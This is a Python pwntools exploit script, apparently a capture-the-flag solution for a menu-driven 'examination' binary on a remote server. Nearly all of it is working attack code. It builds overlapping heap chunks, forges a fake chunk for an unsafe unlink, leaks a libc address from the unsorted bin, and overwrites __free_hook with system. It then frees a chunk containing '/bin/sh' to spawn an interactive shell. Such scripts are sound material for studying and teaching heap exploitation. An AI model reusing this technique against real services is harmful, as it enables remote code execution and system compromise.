from json.tool import main
from platform import architecture
from pwn import *
context(arch = "amd64", os = "Linux", log_level = "Info")
io = process("./examination")

io = remote("124.70.130.92", 60001)
# gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def stop():
    pause()

def add():
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("0")
    sl("1")
    sl("1")
    
def comment(idx, size, data):
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("0")
    ru("choice>>")
    sl("3")
    sl(str(idx))
    if size != 0:
        sl(str(size))
    sl(data)
    
def free(idx):
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("0")
    ru("choice>>")
    sl("4")
    sl(str(idx))
    
#Only can be called when score < 90 or rewarded
def show_comment(idx):
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("1")
    ru("choice>>")
    sl("6")
    sl(str(idx))
    sl("2")
    ru("here is the review:\n")
    msg = u64(rl()[:8])
    log.info("Content is " + hex(msg))
    return msg

def edit_addr(idx, offset):
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("1")
    ru("choice>>")
    sl("6")
    sl(str(idx))
    ru("choice>>")
    sl("3")
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("0")
    ru("choice>>")
    sl("2")
    ru("choice>>")
    sl("5")
    ru("student>:")
    sl("1")
    ru("choice>>")
    sl("6")
    sl(str(idx))
    sl("2")
    ru("reward! ")
    comment_addr = rl()
    edit_address = hex(int(comment_addr, 16) + offset)
    log.info("Recv comment chunk addr of student " + str(idx) + " : " + comment_addr)
    log.info("The addr to edit is " + edit_address)
    edit_address = int(edit_address, 16)
    sl(str(edit_address * 10))
    return comment_addr


sleep(1)
sl("0")
sl("1")
sl("1")
comment(0, 160, "0000")
add()
comment(1, 1008, "AAAA")
add()
comment(2, 64, "BBBB")
add()
comment(3, 1008, "CCCC")

#*edit size field of chunkA to overlapping
chunkA_addr = int(edit_addr(1, 0x49), 16)

#*edit chunk0_ptr to chunkA(bypass segmentation fault because of nullptr)
chunk0_addr = int(edit_addr(2, -0x517), 16)

#*unsafe unlink
chunkC_ptr = chunkA_addr + 0x528
#construct fake chunk
payload = p64(0) + p64(0x201) + p64(chunkC_ptr - 0x18) + p64(chunkC_ptr - 0x10) + p64(0) * 60 
#construct next_chunk(fake_chunk) head
payload += p64(0x200) + p64(0x1f0)                                                         
comment(3, 0, payload)
#unlink here
#*chunkC_ptr point to &chunkC_ptr - 0x18
free(1)

#*leak unsorted_bin(av) to calc addr of libc
#edit chunk0_ptr to chunkA(now chunkA has been freed)
bins_array_addr = show_comment(0)

#*edit free hook to function "system"
free_hook = bins_array_addr + 8808;
log.info("Free hook at: " + hex(free_hook))
payload = p64(0) * 3 + p64(free_hook)
comment(3, 0, payload)
system_addr = bins_array_addr - 0x19a920
log.info("function system at: " + hex(system_addr))
payload = p64(system_addr)
comment(3, 0, payload)

#*place "/bin/sh" into chunkC, then free it
comment(2, 0, "/bin/sh")
free(2)
itr()